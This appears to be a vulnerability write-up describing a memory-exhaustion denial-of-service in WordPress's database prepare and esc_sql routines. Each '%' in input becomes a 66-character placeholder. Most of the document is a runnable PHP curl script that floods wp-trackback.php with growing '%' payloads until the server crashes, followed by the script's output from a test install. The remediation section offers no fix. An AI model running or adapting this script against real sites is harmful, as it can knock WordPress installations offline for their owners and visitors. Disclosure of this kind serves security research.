# WordPress DB prepare method DOS / memory limit

Few years back WP "fixed" prepare method of its DB class and even today it remains one of the failure points for ~40% of the web. What is the bug? Simple, because sprintf usage every % sign is replaced with placeholder 
```
			$algo = function_exists( 'hash' ) ? 'sha256' : 'sha1';
			// Old WP installs may not have AUTH_SALT defined.
			$salt = defined( 'AUTH_SALT' ) && AUTH_SALT ? AUTH_SALT : (string) rand();

			$placeholder = '{' . hash_hmac( $algo, uniqid( $salt, true ), $salt ) . '}';
```
which in most of the setups swaps 1 character % with 66 in memory. Easy DoS, for every routine that calls $wpdb->prepare or esc_sql :)

## Eli5 PoC

This attack would work on every $wpdb->prepare usage like comments or any another data manipulation around WP, but this sample is for wp-trackback.php
```
//post id with turned on trackback
$post_id = 3;
//trackback url 
$target_url = "https://wp.local/wp-trackback.php/".$post_id;
//number of % bytes to increase on every step
$payload_step_increase = 100000;

$ch = curl_init();
$is_500 = false;
$cnt = 0;
$payload = "";

while ( ! $is_500 ){
    
    $payload = str_repeat("%", ( ( $cnt + 1 ) * $payload_step_increase ) );
    
    curl_setopt( $ch, CURLOPT_URL, $target_url );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt( $ch, CURLOPT_HEADER, true ); 
    curl_setopt( $ch, CURLOPT_POST, 1 );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, "url=".$payload."&title=title&blog_name=blog_name" );
    
    $response = curl_exec( $ch );
    
    if ( ! curl_errno( $ch ) ){
        $response_http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
        if ( $response_http_code >= 500 ){
            echo ($cnt+1)." * ".$payload_step_increase." % caused 500+ on ".$target_url."\n";
            echo "Check content of headers-body-500.txt for response data\n";
            @file_put_contents( "headers-body-500.txt", $response );
            $is_500 = true;
        }else{
            echo ($cnt+1)." step returned ".$response_http_code." http response code\n";
        }
    }
    
    $cnt++;
    curl_reset( $ch );

}

curl_close( $ch );

``` 

on my default setup memory_limit was reached on 5th try

```
1 step returned 409 http response code
2 step returned 409 http response code
3 step returned 409 http response code
4 step returned 409 http response code
5 * 100000 % caused 500+ on http://wp.local/wp-trackback.php/3
Check content of headers-body-500.txt for response data
```
where memory_limit is 128M and post_max_size is 8M.

## Few facts

- if only one prepare / esc_sql occurs during code execution memory_limit should be bigger than 66 * post_max_size
- there are cases for popular plugins and wp core where user/visitor input would cause permanent http 500 status code in the wp admin

## Remediation

- Good luck :)
 


